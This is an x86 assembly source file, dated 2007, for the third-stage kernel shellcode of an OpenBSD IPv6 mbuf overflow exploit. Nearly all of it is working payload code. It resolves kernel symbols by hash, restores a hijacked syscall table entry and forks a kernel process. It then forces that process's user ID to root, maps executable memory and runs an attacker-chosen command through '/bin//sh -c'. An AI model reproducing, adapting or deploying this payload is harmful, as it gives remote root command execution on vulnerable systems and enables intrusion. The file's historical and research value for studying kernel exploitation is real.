 #
 # Stage 3 Shell Command (OpenBSD IPv6 mbuf overflow).
 #
 #  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #     notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #     notice, this list of conditions and the following disclaimer in the
 #     documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #     derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 #

# Hash of symbols to resolve
.set HASH_sysent, 0xedcb2234
.set HASH_fork1, 0x06995591
.set HASH_copyout, 0xa53e4b2d

.set SYS_exit, 1
.set SYS_mmap, 197
.set SYS_execve, 59


# Resolve syscall address from table
.macro get_syscall idx, reg
    movl   -8(%ebp), %ecx
    movl   \idx, \reg # Index
    movl   4(%ecx, \reg, 8), \reg
.endm

# Set syscall address in table
.macro set_syscall idx, addr
    movl   -8(%ebp), %ecx
    movl   \idx, %eax # Index
    movl   \addr, 4(%ecx, %eax, 8)
.endm

# Copy kernel memory to userland
.macro ucopy kaddr, uaddr, len
	# We save the kernel address in case %esp is used
    movl    \kaddr, %eax 
    pushl   \len
    pushl   \uaddr
    pushl   %eax
	call	*-4(%ebp) # copyout
    addl    $12, %esp
.endm


# Get PID of current process
.macro getpid proc, reg
	movl 52(\proc), \reg
.endm

.global shell_start
.global shell_end

#
# Start of command.
# The buffer we run in is prepended with
# 1) The address to the hash_resolve routine
# 2) The address of the real system call
# 3) The index of the system call
#
.text
shell_start:
	# Get our location
	call get_shell_start_location
	nop
	get_shell_start_location:

	# Point to start of code
	# to extract syscall information
	popl	%ecx
	subl	$5, %ecx

    pushl   %ebp
    movl    %esp, %ebp

	# hash_resolve -4(%ebp)
	pushl	-12(%ecx)

	# sysent -8(%ebp)
	pushl	$HASH_sysent
	call	*-4(%ebp)
	popl	%edx
	pushl	%eax

	# copyout -12(%ebp)
	pushl	$HASH_copyout
	call	*-4(%ebp)
	popl	%edx
	pushl	%eax

	# fork1 -16(%ebp)
	pushl	$HASH_fork1
	call	*-4(%ebp)
	popl	%edx
	pushl	%eax

	# Don't recover syscall if PID 0 (swapper)
	movl	8(%ebp), %eax
	getpid	%eax, %eax
	cmpl	$0, %eax
	je		call_real_syscall

	# Recover syscall
	movl	-4(%ecx), %edx # syscall address
	movl	-8(%ecx), %eax # Index
	set_syscall %eax, %edx

	# Call real syscall
	call_real_syscall:
		pushl	16(%ebp)	# retval
		pushl	12(%ebp)	# arg
		pushl	8(%ebp)		# curproc
		call	*%edx
		pushl	%eax		# Save return value

	# Don't fork1 from PID 0 (swapper)
	movl	8(%ebp), %eax
	getpid	%eax, %eax
	cmpl	$0, %eax
	je      syscall_finished
    xorl    %eax, %eax
    pushl   %eax
    pushl   %eax
    pushl   %eax
    jmp     shell_proc_addr
    got_shell_proc_addr:	# function
    pushl   %eax
    pushl   %eax
    pushl   $0x40		# FORK_NOZOMBIE
    pushl   %eax		# 0 = No signal
	pushl	8(%ebp)		# curproc
	movl	-16(%ebp), %eax
    call    *%eax
	addl	$36, %esp

	# Return value from real syscall
	syscall_finished:
		popl	%eax
		movl    %ebp, %esp
		popl    %ebp
		ret

# Get address to connect_back funktion below
shell_proc_addr:
	call	got_shell_proc_addr

# The new process starts here
# The argument is the address of curproc - 8(%ebp)

# Set uid to zero in process
.macro setuid_root proc
    movl    16(\proc), %eax   # struct pcred pointer
    movl    $0, 4(%eax)       # real user id.
.endm

.globl shell_resolve_hash_offset
.globl shell_cmd_len_offset
shell_proc:

    # Get our location
    call get_shell_location
    nop
    get_shell_location:

    # Point to start of code
    # to extract address to hash_resolve
    popl    %ecx
    subl    $5, %ecx

	shell_resolve_hash_offset:
	subl	$0x41424344, %ecx
	movl	(%ecx), %ecx

	pushl   %ebp
	movl    %esp, %ebp

    # copyout -4(%ebp)
    pushl   $HASH_copyout
    call    *%ecx		# hash_resolve
    movl	%eax, -4(%ebp)

    # sysent -8(%ebp)
    pushl   $HASH_sysent
    call    *%ecx		# hash_resolve
    movl	%eax, -8(%ebp)

	# Make sure we run as UID 0
	movl	8(%ebp), %edx
	setuid_root %edx

    # Allocate user space memory
    # sys_mmap(p, &{addr, len, prot, flags, fd, pad, pos}, retval)
    xorl    %eax, %eax
    pushl   %eax        # pos
    pushl   %eax        # pad
    pushl   $-1         # fd = -1
    pushl   $0x1002     # MAP_ANON|MAP_PRIVATE
    pushl   $0x7        # PROT_READ|PROT_WRITE|PROT_EXEC
    pushl   $1024       # len
    pushl   %eax        # addr
    movl    %esp, %ebx  # &margs

    pushl   %eax
    pushl   %eax
    movl    %esp, %esi  # retval

    pushl   %esi
    pushl   %ebx
    movl    8(%ebp), %ebx   # curproc
    pushl   %ebx
    get_syscall $SYS_mmap, %eax
    call    *%eax

    test    %eax, %eax
    jnz     exit_process
    movl    (%esi), %edi # Buffer

    # Execve (/bin//sh -c 'command ...')
	# (%edi) = "/bin//sh"
    xorl    %eax, %eax
    pushl   %eax         # string end with NULL
    pushl   $0x68732f2f  # push 'hs//' (//sh)
    pushl   $0x6e69622f  # push 'nib/' (/bin)
    ucopy   %esp, %edi, $9

	# 10(%edi) = "-c"
	addl	$10, %edi
	pushl	$0x0000632d	# "-c"
	ucopy   %esp, %edi, $4	
	subl	$10, %edi

	# 14(%edi) = { "/bin//sh", "-c", "<cmd>", NULL}
	xorl    %eax, %eax
	pushl   %eax        # NULL
	addl	$42, %edi
	pushl	%edi		# "<cmd>"
	subl	$32, %edi
	pushl   %edi        # "-c"
	subl	$10, %edi
	pushl   %edi        # "/bin//sh"

	addl	$14, %edi	# 14(%edi)
	ucopy   %esp, %edi, $16

	# 30(%edi) = args { file, argv, envp } 
	xorl	%eax, %eax
	pushl	%eax		# NULL
	pushl   %edi        # argv
	subl	$14, %edi
	pushl	%edi		# file

	addl	$30, %edi	# 30(%edi)
	ucopy   %esp, %edi, $12

	# 42(%edi) = "<cmd>"
	jmp	shell_command
	got_shell_command:
	popl	%eax		# "cmd" pointer
	addl	$12, %edi	# 42(%edi)
	shell_cmd_len_offset:
	movl	$0x41424344, %edx
    ucopy   %eax, %edi, %edx

    pushl   %esi		# retval
	subl	$12, %edi   # 30(%edi)
    pushl   %edi		# args 30(%edi)
    pushl   %ebx		# curproc

    get_syscall $SYS_execve, %eax
    call    *%eax
	test	%eax, %eax
	jz		finished				

	# If we failed, terminate process
    exit_process:
        pushl   %esi
        pushl   %edi
        pushl   %ebx
        get_syscall $SYS_exit, %eax
        call    *%eax
		addl	$12, %esp

	finished:
		movl	%ebp, %esp
		popl	%ebp
		ret

# Shell command is prepended to the shellcode
shell_command:
	call	got_shell_command

shell_end:
